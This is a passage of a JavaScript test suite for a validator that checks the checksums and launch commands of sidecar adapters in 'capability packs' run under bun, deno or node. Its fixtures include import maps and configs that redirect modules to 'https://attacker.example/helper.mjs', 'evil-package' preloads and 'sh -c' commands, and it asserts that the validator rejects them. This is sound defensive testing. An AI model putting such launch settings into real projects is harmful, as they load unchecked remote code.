      adapter: { kind: 'sidecar', command: ['bun', 'sidecar.mjs', '--config=config.json'] },
      docs: [],
      checksums: [
        { path: 'sidecar.mjs', checksum: sidecarChecksum },
        { path: 'config.json', checksum: sidecarChecksum },
      ],
    }, { 'sidecar.mjs': sidecar, 'config.json': sidecar }), true);
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['bun', '--config=config.json', 'sidecar.mjs'] },
        docs: [],
        checksums: [{ path: 'sidecar.mjs', checksum: sidecarChecksum }],
      }, { 'sidecar.mjs': sidecar }),
      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['bun', '--config', 'cfg', 'sidecar.mjs'] },
        docs: [],
        checksums: [{ path: 'sidecar.mjs', checksum: sidecarChecksum }],
      }, { 'sidecar.mjs': sidecar }),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['bun', '--config', 'config.json', 'sidecar.mjs'] },
        docs: [],
        checksums: [{ path: 'sidecar.mjs', checksum: sidecarChecksum }],
      }, { 'sidecar.mjs': sidecar }),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['bun', '--config', 'config.json', 'sidecar.mjs'] },
        docs: [],
        checksums: [
          { path: 'sidecar.mjs', checksum: sidecarChecksum },
          { path: 'config.json', checksum: sidecarChecksum },
        ],
      }, { 'sidecar.mjs': sidecar, 'config.json': sidecar }),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['bun', '--config-file=./bunfig.toml', 'sidecar.mjs'] },
        docs: [],
        checksums: [{ path: 'sidecar.mjs', checksum: sidecarChecksum }],
      }, { 'sidecar.mjs': sidecar }),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    const bunConfigWithPreload = fromUtf8('preload = ["./unchecked.ts"]\n');
    const bunConfigWithPreloadChecksum = `sha256:${await sha256Hex(bunConfigWithPreload)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['bun', '--config=./bunfig.toml', 'sidecar.mjs'] },
        docs: [],
        checksums: [
          { path: 'sidecar.mjs', checksum: sidecarChecksum },
          { path: './bunfig.toml', checksum: bunConfigWithPreloadChecksum },
        ],
      }, { 'sidecar.mjs': sidecar, './bunfig.toml': bunConfigWithPreload }),
      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
    );
    const bunConfigPreloadImport = fromUtf8("import 'node:fs';\n");
    const bunConfigPreloadImportChecksum = `sha256:${await sha256Hex(bunConfigPreloadImport)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['bun', '--config=./bunfig.toml', 'sidecar.mjs'] },
        docs: [],
        checksums: [
          { path: 'sidecar.mjs', checksum: sidecarChecksum },
          { path: './bunfig.toml', checksum: bunConfigWithPreloadChecksum },
          { path: './unchecked.ts', checksum: bunConfigPreloadImportChecksum },
        ],
      }, { 'sidecar.mjs': sidecar, './bunfig.toml': bunConfigWithPreload, './unchecked.ts': bunConfigPreloadImport }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['bun', '-c=./bunfig.toml', 'sidecar.mjs'] },
        docs: [],
        checksums: [
          { path: 'sidecar.mjs', checksum: sidecarChecksum },
          { path: './bunfig.toml', checksum: bunConfigWithPreloadChecksum },
        ],
      }, { 'sidecar.mjs': sidecar, './bunfig.toml': bunConfigWithPreload }),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['bun', '-c', './bunfig.toml', 'sidecar.mjs'] },
        docs: [],
        checksums: [
          { path: 'sidecar.mjs', checksum: sidecarChecksum },
          { path: './bunfig.toml', checksum: bunConfigWithPreloadChecksum },
        ],
      }, { 'sidecar.mjs': sidecar, './bunfig.toml': bunConfigWithPreload }),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['bun', '-c./bunfig.toml', 'sidecar.mjs'] },
        docs: [],
        checksums: [{ path: 'sidecar.mjs', checksum: sidecarChecksum }],
      }, { 'sidecar.mjs': sidecar }),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['bun', '-c./bunfig.toml', 'sidecar.mjs'] },
        docs: [],
        checksums: [
          { path: 'sidecar.mjs', checksum: sidecarChecksum },
          { path: './bunfig.toml', checksum: bunConfigWithPreloadChecksum },
        ],
      }, { 'sidecar.mjs': sidecar, './bunfig.toml': bunConfigWithPreload }),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    const bunConfigWithQuotedPreloadKey = fromUtf8('"preload" = ["./unchecked.ts"]\n');
    const bunConfigWithQuotedPreloadKeyChecksum = `sha256:${await sha256Hex(bunConfigWithQuotedPreloadKey)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['bun', '--config=./bunfig.toml', 'sidecar.mjs'] },
        docs: [],
        checksums: [
          { path: 'sidecar.mjs', checksum: sidecarChecksum },
          { path: './bunfig.toml', checksum: bunConfigWithQuotedPreloadKeyChecksum },
        ],
      }, { 'sidecar.mjs': sidecar, './bunfig.toml': bunConfigWithQuotedPreloadKey }),
      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
    );
    const bunConfigWithEscapedPreloadKey = fromUtf8('"pre\\u006coad" = ["./unchecked.ts"]\n');
    const bunConfigWithEscapedPreloadKeyChecksum = `sha256:${await sha256Hex(bunConfigWithEscapedPreloadKey)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['bun', '--config=./bunfig.toml', 'sidecar.mjs'] },
        docs: [],
        checksums: [
          { path: 'sidecar.mjs', checksum: sidecarChecksum },
          { path: './bunfig.toml', checksum: bunConfigWithEscapedPreloadKeyChecksum },
        ],
      }, { 'sidecar.mjs': sidecar, './bunfig.toml': bunConfigWithEscapedPreloadKey }),
      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
    );
    const bunConfigWithCommentedArrayClose = fromUtf8('preload = [\n  # ]\n  "./unchecked.ts"\n]\n');
    const bunConfigWithCommentedArrayCloseChecksum = `sha256:${await sha256Hex(bunConfigWithCommentedArrayClose)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['bun', '--config=./bunfig.toml', 'sidecar.mjs'] },
        docs: [],
        checksums: [
          { path: 'sidecar.mjs', checksum: sidecarChecksum },
          { path: './bunfig.toml', checksum: bunConfigWithCommentedArrayCloseChecksum },
        ],
      }, { 'sidecar.mjs': sidecar, './bunfig.toml': bunConfigWithCommentedArrayClose }),
      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
    );
    const bunConfigWithMultilineStringBeforePreload = fromUtf8('banner = """\n[not-a-table]\n"""\npreload = ["./unchecked.ts"]\n');
    const bunConfigWithMultilineStringBeforePreloadChecksum = `sha256:${await sha256Hex(bunConfigWithMultilineStringBeforePreload)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['bun', '--config=./bunfig.toml', 'sidecar.mjs'] },
        docs: [],
        checksums: [
          { path: 'sidecar.mjs', checksum: sidecarChecksum },
          { path: './bunfig.toml', checksum: bunConfigWithMultilineStringBeforePreloadChecksum },
        ],
      }, { 'sidecar.mjs': sidecar, './bunfig.toml': bunConfigWithMultilineStringBeforePreload }),
      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
    );
    const bunConfigWithStringPreload = fromUtf8('preload = "./unchecked.ts"\n');
    const bunConfigWithStringPreloadChecksum = `sha256:${await sha256Hex(bunConfigWithStringPreload)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['bun', '--config=./bunfig.toml', 'sidecar.mjs'] },
        docs: [],
        checksums: [
          { path: 'sidecar.mjs', checksum: sidecarChecksum },
          { path: './bunfig.toml', checksum: bunConfigWithStringPreloadChecksum },
        ],
      }, { 'sidecar.mjs': sidecar, './bunfig.toml': bunConfigWithStringPreload }),
      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['bun', '--config=./bunfig.toml', 'sidecar.mjs'] },
        docs: [],
        checksums: [
          { path: 'sidecar.mjs', checksum: sidecarChecksum },
          { path: './bunfig.toml', checksum: bunConfigWithStringPreloadChecksum },
          { path: './unchecked.ts', checksum: bunConfigPreloadImportChecksum },
        ],
      }, { 'sidecar.mjs': sidecar, './bunfig.toml': bunConfigWithStringPreload, './unchecked.ts': bunConfigPreloadImport }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    const bunConfigWithPackagePreload = fromUtf8('preload = ["unchecked-package"]\n');
    const bunConfigWithPackagePreloadChecksum = `sha256:${await sha256Hex(bunConfigWithPackagePreload)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['bun', '--config=./bunfig.toml', 'sidecar.mjs'] },
        docs: [],
        checksums: [
          { path: 'sidecar.mjs', checksum: sidecarChecksum },
          { path: './bunfig.toml', checksum: bunConfigWithPackagePreloadChecksum },
        ],
      }, { 'sidecar.mjs': sidecar, './bunfig.toml': bunConfigWithPackagePreload }),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    const bunConfigWithTestOnlyPreload = fromUtf8('[test]\npreload = ["unchecked-package"]\n');
    const bunConfigWithTestOnlyPreloadChecksum = `sha256:${await sha256Hex(bunConfigWithTestOnlyPreload)}`;
    assert.equal(await assertCapabilityPackChecksums({
      ...manifest,
      adapter: { kind: 'sidecar', command: ['bun', '--config=./bunfig.toml', 'sidecar.mjs'] },
      docs: [],
      checksums: [
        { path: 'sidecar.mjs', checksum: sidecarChecksum },
        { path: './bunfig.toml', checksum: bunConfigWithTestOnlyPreloadChecksum },
      ],
    }, { 'sidecar.mjs': sidecar, './bunfig.toml': bunConfigWithTestOnlyPreload }), true);
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['deno', 'run', '--no-config', '--import-map=https://attacker.example/map.json', 'sidecar.mjs'] },
        docs: [],
        checksums: [{ path: 'sidecar.mjs', checksum: sidecarChecksum }],
      }, { 'sidecar.mjs': sidecar }),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    const denoImportMap = fromUtf8(JSON.stringify({ imports: { './helper.mjs': 'https://attacker.example/helper.mjs' } }));
    const denoImportMapChecksum = `sha256:${await sha256Hex(denoImportMap)}`;
    const denoImportMapSidecar = fromUtf8("import './helper.mjs';\n");
    const denoImportMapSidecarChecksum = `sha256:${await sha256Hex(denoImportMapSidecar)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['deno', 'run', '--no-config', '--import-map', 'import_map.json', 'sidecar.mjs'] },
        docs: [],
        checksums: [
          { path: 'sidecar.mjs', checksum: denoImportMapSidecarChecksum },
          { path: 'import_map.json', checksum: denoImportMapChecksum },
          { path: './helper.mjs', checksum: sidecarChecksum },
        ],
      }, {
        'sidecar.mjs': denoImportMapSidecar,
        'import_map.json': denoImportMap,
        './helper.mjs': sidecar,
      }),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    const denoConfig = fromUtf8('{\n  // ordinary config is allowed\n  "compilerOptions": { "strict": true }\n}\n');
    const denoConfigChecksum = `sha256:${await sha256Hex(denoConfig)}`;
    assert.equal(await assertCapabilityPackChecksums({
      ...manifest,
      adapter: { kind: 'sidecar', command: ['deno', 'run', '--config', 'deno.jsonc', 'sidecar.mjs'] },
      docs: [],
      checksums: [
        { path: 'sidecar.mjs', checksum: sidecarChecksum },
        { path: 'deno.jsonc', checksum: denoConfigChecksum },
      ],
    }, { 'sidecar.mjs': sidecar, 'deno.jsonc': denoConfig }), true);
    const denoConfigExtendsBase = fromUtf8(JSON.stringify({ extends: './base.json' }));
    const denoConfigExtendsBaseChecksum = `sha256:${await sha256Hex(denoConfigExtendsBase)}`;
    const denoBaseConfig = fromUtf8(JSON.stringify({ compilerOptions: { strict: true } }));
    const denoBaseConfigChecksum = `sha256:${await sha256Hex(denoBaseConfig)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['deno', 'run', '--config', 'deno.json', 'sidecar.mjs'] },
        docs: [],
        checksums: [
          { path: 'sidecar.mjs', checksum: sidecarChecksum },
          { path: 'deno.json', checksum: denoConfigExtendsBaseChecksum },
        ],
      }, { 'sidecar.mjs': sidecar, 'deno.json': denoConfigExtendsBase }),
      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
    );
    assert.equal(await assertCapabilityPackChecksums({
      ...manifest,
      adapter: { kind: 'sidecar', command: ['deno', 'run', '--config', 'deno.json', 'sidecar.mjs'] },
      docs: [],
      checksums: [
        { path: 'sidecar.mjs', checksum: sidecarChecksum },
        { path: 'deno.json', checksum: denoConfigExtendsBaseChecksum },
        { path: 'base.json', checksum: denoBaseConfigChecksum },
      ],
    }, { 'sidecar.mjs': sidecar, 'deno.json': denoConfigExtendsBase, 'base.json': denoBaseConfig }), true);
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['deno', 'run', '--config', 'deno.json', '-P=full', 'sidecar.mjs'] },
        docs: [],
        checksums: [
          { path: 'sidecar.mjs', checksum: sidecarChecksum },
          { path: 'deno.json', checksum: denoConfigExtendsBaseChecksum },
          { path: 'base.json', checksum: denoBaseConfigChecksum },
        ],
      }, { 'sidecar.mjs': sidecar, 'deno.json': denoConfigExtendsBase, 'base.json': denoBaseConfig }),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['deno', 'run', '--config', 'configs/deno.json', 'sidecar.mjs'] },
        docs: [],
        checksums: [
          { path: 'sidecar.mjs', checksum: sidecarChecksum },
          { path: 'configs/deno.json', checksum: denoConfigExtendsBaseChecksum },
          { path: './base.json', checksum: denoBaseConfigChecksum },
        ],
      }, { 'sidecar.mjs': sidecar, 'configs/deno.json': denoConfigExtendsBase, './base.json': denoBaseConfig }),
      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
    );
    const denoConfigWithImportMap = fromUtf8(JSON.stringify({ importMap: 'import_map.json' }));
    const denoConfigWithImportMapChecksum = `sha256:${await sha256Hex(denoConfigWithImportMap)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['deno', 'run', '--config=deno.json', 'sidecar.mjs'] },
        docs: [],
        checksums: [
          { path: 'sidecar.mjs', checksum: sidecarChecksum },
          { path: 'deno.json', checksum: denoConfigWithImportMapChecksum },
        ],
      }, { 'sidecar.mjs': sidecar, 'deno.json': denoConfigWithImportMap }),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    const denoConfigWithImports = fromUtf8(JSON.stringify({ imports: { './helper.mjs': 'https://attacker.example/helper.mjs' } }));
    const denoConfigWithImportsChecksum = `sha256:${await sha256Hex(denoConfigWithImports)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['deno', 'run', '--config', 'deno.json', 'sidecar.mjs'] },
        docs: [],
        checksums: [
          { path: 'sidecar.mjs', checksum: sidecarChecksum },
          { path: 'deno.json', checksum: denoConfigWithImportsChecksum },
        ],
      }, { 'sidecar.mjs': sidecar, 'deno.json': denoConfigWithImports }),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    const denoConfigWithScopes = fromUtf8(JSON.stringify({ scopes: { './': { './helper.mjs': 'https://attacker.example/helper.mjs' } } }));
    const denoConfigWithScopesChecksum = `sha256:${await sha256Hex(denoConfigWithScopes)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['deno', 'run', '--config', 'deno.json', 'sidecar.mjs'] },
        docs: [],
        checksums: [
          { path: 'sidecar.mjs', checksum: sidecarChecksum },
          { path: 'deno.json', checksum: denoConfigWithScopesChecksum },
        ],
      }, { 'sidecar.mjs': sidecar, 'deno.json': denoConfigWithScopes }),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    const denoBaseConfigWithImports = fromUtf8(JSON.stringify({ imports: { './helper.mjs': 'https://attacker.example/helper.mjs' } }));
    const denoBaseConfigWithImportsChecksum = `sha256:${await sha256Hex(denoBaseConfigWithImports)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['deno', 'run', '--config', 'deno.json', 'sidecar.mjs'] },
        docs: [],
        checksums: [
          { path: 'sidecar.mjs', checksum: sidecarChecksum },
          { path: 'deno.json', checksum: denoConfigExtendsBaseChecksum },
          { path: 'base.json', checksum: denoBaseConfigWithImportsChecksum },
        ],
      }, { 'sidecar.mjs': sidecar, 'deno.json': denoConfigExtendsBase, 'base.json': denoBaseConfigWithImports }),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    const denoConfigWithDuplicateExtends = fromUtf8('{"extends":"./base.json","extends":"./unsafe.json"}\n');
    const denoConfigWithDuplicateExtendsChecksum = `sha256:${await sha256Hex(denoConfigWithDuplicateExtends)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['deno', 'run', '--config', 'deno.json', 'sidecar.mjs'] },
        docs: [],
        checksums: [
          { path: 'sidecar.mjs', checksum: sidecarChecksum },
          { path: 'deno.json', checksum: denoConfigWithDuplicateExtendsChecksum },
          { path: 'base.json', checksum: denoBaseConfigChecksum },
          { path: 'unsafe.json', checksum: denoBaseConfigWithImportsChecksum },
        ],
      }, {
        'sidecar.mjs': sidecar,
        'deno.json': denoConfigWithDuplicateExtends,
        'base.json': denoBaseConfig,
        'unsafe.json': denoBaseConfigWithImports,
      }),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['bun', '--config', 'config.json', '-e', 'console.log(1)'] },
        docs: [],
        checksums: [{ path: 'config.json', checksum: sidecarChecksum }],
      }, { 'config.json': sidecar }),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    const sidecarEnvFile = fromUtf8('SETTING=value\n');
    const sidecarEnvFileChecksum = `sha256:${await sha256Hex(sidecarEnvFile)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['node', '--env-file', '.env.local', 'sidecar.mjs'] },
        docs: [],
        checksums: [{ path: 'sidecar.mjs', checksum: sidecarChecksum }],
      }, { 'sidecar.mjs': sidecar }),
      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['bun', '--env-file-if-exists=.env.local', 'sidecar.mjs'] },
        docs: [],
        checksums: [
          { path: 'sidecar.mjs', checksum: sidecarChecksum },
          { path: '.env.local', checksum: sidecarEnvFileChecksum },
        ],
      }, { 'sidecar.mjs': sidecar, '.env.local': sidecarEnvFile }),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['bun', '--cwd', 'workdir', 'sidecar.mjs'] },
        docs: [],
        checksums: [{ path: 'sidecar.mjs', checksum: sidecarChecksum }],
      }, { 'sidecar.mjs': sidecar }),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['bun', '--no-config', 'sidecar.mjs'] },
        docs: [],
        checksums: [{ path: 'sidecar.mjs', checksum: sidecarChecksum }],
      }, { 'sidecar.mjs': sidecar }),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['bun', '--conditions', 'prod', '--cwd', 'workdir', 'sidecar.mjs'] },
        docs: [],
        checksums: [{ path: 'sidecar.mjs', checksum: sidecarChecksum }],
      }, { 'sidecar.mjs': sidecar }),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    assert.equal(await assertCapabilityPackChecksums({
      ...manifest,
      adapter: { kind: 'sidecar', command: ['node', '--env-file', '.env.local', 'sidecar.mjs'] },
      docs: [],
      checksums: [
        { path: 'sidecar.mjs', checksum: sidecarChecksum },
        { path: '.env.local', checksum: sidecarEnvFileChecksum },
      ],
    }, { 'sidecar.mjs': sidecar, '.env.local': sidecarEnvFile }), true);
    const nodeConfigWithImport = fromUtf8(JSON.stringify({ nodeOptions: { import: 'evil-package' } }));
    const nodeConfigWithImportChecksum = `sha256:${await sha256Hex(nodeConfigWithImport)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['node', '--experimental-config-file=./node.config.json', 'sidecar.mjs'] },
        docs: [],
        checksums: [
          { path: 'sidecar.mjs', checksum: sidecarChecksum },
          { path: './node.config.json', checksum: nodeConfigWithImportChecksum },
        ],
      }, { 'sidecar.mjs': sidecar, './node.config.json': nodeConfigWithImport }),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    const sidecarCertificate = fromUtf8('-----BEGIN CERTIFICATE-----\npublic\n-----END CERTIFICATE-----\n');
    const sidecarCertificateChecksum = `sha256:${await sha256Hex(sidecarCertificate)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['deno', 'run', '--no-config', '--cert', 'cert.pem', 'sidecar.mjs'] },
        docs: [],
        checksums: [{ path: 'sidecar.mjs', checksum: sidecarChecksum }],
      }, { 'sidecar.mjs': sidecar }),
      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
    );
    assert.equal(await assertCapabilityPackChecksums({
      ...manifest,
      adapter: { kind: 'sidecar', command: ['deno', 'run', '--no-config', '--cert', 'cert.pem', 'sidecar.mjs'] },
      docs: [],
      checksums: [
        { path: 'sidecar.mjs', checksum: sidecarChecksum },
        { path: 'cert.pem', checksum: sidecarCertificateChecksum },
      ],
    }, { 'sidecar.mjs': sidecar, 'cert.pem': sidecarCertificate }), true);
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['bun', '--preload=./helper.mjs', 'sidecar.mjs'] },
        docs: [],
        checksums: [{ path: 'sidecar.mjs', checksum: sidecarChecksum }],
      }, { 'sidecar.mjs': sidecar }),
      { code: 'ERR_CAPABILITY_PACK_CHECKSUM_REQUIRED' },
    );
    const sidecarOptionImport = fromUtf8("import 'node:fs';\nconsole.log('ready');\n");
    const sidecarOptionImportChecksum = `sha256:${await sha256Hex(sidecarOptionImport)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['bun', '--preload=./helper.mjs', 'sidecar.mjs'] },
        docs: [],
        checksums: [
          { path: 'sidecar.mjs', checksum: sidecarChecksum },
          { path: './helper.mjs', checksum: sidecarOptionImportChecksum },
        ],
      }, { 'sidecar.mjs': sidecar, './helper.mjs': sidecarOptionImport }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    assert.equal(await assertCapabilityPackChecksums({
      ...manifest,
      adapter: { kind: 'sidecar', command: ['node', '-r./helper.mjs', 'sidecar.mjs'] },
      docs: [],
      checksums: [
        { path: 'sidecar.mjs', checksum: sidecarChecksum },
        { path: './helper.mjs', checksum: sidecarChecksum },
      ],
    }, { 'sidecar.mjs': sidecar, './helper.mjs': sidecar }), true);
    const extensionlessPreloadImport = fromUtf8("const fs = require('node:fs');\n");
    const extensionlessPreloadImportChecksum = `sha256:${await sha256Hex(extensionlessPreloadImport)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['node', '--require', './helper', 'sidecar.mjs'] },
        docs: [],
        checksums: [
          { path: 'sidecar.mjs', checksum: sidecarChecksum },
          { path: './helper', checksum: extensionlessPreloadImportChecksum },
        ],
      }, { 'sidecar.mjs': sidecar, './helper': extensionlessPreloadImport }),
      { code: 'ERR_CAPABILITY_PACK_ADAPTER_EXTERNAL_IMPORT' },
    );
    assert.equal(await assertCapabilityPackChecksums({
      ...manifest,
      adapter: { kind: 'sidecar', command: ['node', '-r./helper.mjs', 'sidecar.mjs', '-p8080'] },
      docs: [],
      checksums: [
        { path: 'sidecar.mjs', checksum: sidecarChecksum },
        { path: './helper.mjs', checksum: sidecarChecksum },
      ],
    }, { 'sidecar.mjs': sidecar, './helper.mjs': sidecar }), true);
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['node', '--import=preload.mjs', 'sidecar.mjs'] },
        docs: [],
        checksums: [
          { path: 'sidecar.mjs', checksum: sidecarChecksum },
          { path: 'preload.mjs', checksum: sidecarChecksum },
        ],
      }, { 'sidecar.mjs': sidecar, 'preload.mjs': sidecar }),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['node', '--import=evil-package', 'sidecar.mjs'] },
        docs: [],
        checksums: [{ path: 'sidecar.mjs', checksum: sidecarChecksum }],
      }, { 'sidecar.mjs': sidecar }),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['./node', '--import=evil-package', 'sidecar.mjs'] },
        docs: [],
        checksums: [
          { path: './node', checksum: sidecarChecksum },
          { path: 'sidecar.mjs', checksum: sidecarChecksum },
        ],
      }, { './node': sidecar, 'sidecar.mjs': sidecar }),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['env', 'node', '--import=evil-package', 'sidecar.mjs'] },
        docs: [],
        checksums: [{ path: 'sidecar.mjs', checksum: sidecarChecksum }],
      }, { 'sidecar.mjs': sidecar }),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['sh', '-c', 'echo unchecked'] },
        docs: [],
        checksums: [],
      }, {}),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['SH', '-c', 'echo unchecked'] },
        docs: [],
        checksums: [],
      }, {}),
      { code: 'ERR_CAPABILITY_PACK_SIDECAR_COMMAND_UNSAFE' },
    );
    const scopedPreload = fromUtf8('export const scoped = true;');
    const scopedPreloadChecksum = `sha256:${await sha256Hex(scopedPreload)}`;
    await assert.rejects(
      () => assertCapabilityPackChecksums({
        ...manifest,
        adapter: { kind: 'sidecar', command: ['node', '--require=@scope/register', 'sidecar.mjs'] },
        docs: [],
        checksums: [
          { path: 'sidecar.mjs', checksum: sidecarChecksum },
          { path: '@scope/register', checksum: scopedPreloadChecksum },
        ],
      }, { 'sidecar.mjs': sidecar, '@scope/register': scopedPreload }),
